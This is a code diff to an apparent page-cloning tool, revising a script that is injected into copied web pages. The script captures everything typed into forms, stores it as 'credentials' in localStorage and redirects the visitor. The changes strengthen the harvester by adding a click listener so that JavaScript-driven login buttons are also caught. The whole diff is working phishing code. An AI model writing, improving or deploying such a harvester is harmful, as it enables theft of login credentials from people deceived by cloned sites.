@@ -24,28 +24,27 @@ export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;
 
 const getHarvesterScript = (redirectUrl: string) => `
 <script>
-  // Listen for all form submission events on the page at the capture phase
-  document.addEventListener('submit', function(e) {
-    // Prevent the form from actually submitting to its original destination
-    e.preventDefault();
+  // This is a robust capture function that can be called by multiple event listeners.
+  function captureAndRedirect(formElement) {
+    // Ensure we have a valid form element
+    if (!(formElement instanceof HTMLFormElement)) {
+      console.warn('Capture target is not a form element.');
+      window.location.href = '${redirectUrl}';
+      return;
+    }
     
-    const form = e.target;
-    if (!(form instanceof HTMLFormElement)) return;
-
-    // A generic object to hold all captured data
     let credentials = {};
-    const inputs = form.querySelectorAll('input');
+    const inputs = formElement.querySelectorAll('input');
     
-    // Loop through all inputs and capture their name and value
     inputs.forEach(input => {
-      // Ignore hidden fields and buttons
+      // Capture all input fields except for hidden ones and buttons, if they have a name and a value.
       if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.name && input.value) {
         credentials[input.name] = input.value;
       }
     });
 
     try {
-      // Only save if we actually captured something
+      // Only save to localStorage if we actually captured some credentials.
       if (Object.keys(credentials).length > 0) {
         const entry = {
             ...credentials,
@@ -57,14 +56,36 @@ const getHarvesterScript = (redirectUrl: string) => `
         localStorage.setItem('netra-credentials', JSON.stringify(updatedCreds));
       }
     } catch (err) {
-      // Log error to console but do not disrupt user flow
       console.error('Error saving credentials to localStorage:', err);
     }
-
-    // Redirect the user to the specified URL
-    window.location.href = '${redirectUrl}';
     
-  }, true); // Use capture:true to ensure our listener runs before any others
+    // Redirect the user to the specified URL after attempting to capture credentials.
+    window.location.href = '${redirectUrl}';
+  }
+
+  // Listener for standard form submissions.
+  document.addEventListener('submit', function(e) {
+    e.preventDefault();
+    captureAndRedirect(e.target);
+  }, true);
+
+  // Listener for clicks on buttons that might trigger a JS-based submission.
+  document.addEventListener('click', function(e) {
+    let target = e.target;
+    // Find the button if the click was on an element inside it (like an icon).
+    if (target.tagName !== 'BUTTON') {
+      target = target.closest('button');
+    }
+
+    if (target && target.tagName === 'BUTTON' && (target.type === 'submit' || !target.type)) {
+      const form = target.form;
+      if (form) {
+        // We found a button inside a form, so we'll treat this as a submission attempt.
+        e.preventDefault();
+        captureAndRedirect(form);
+      }
+    }
+  }, true);
 </script>
 `;
 
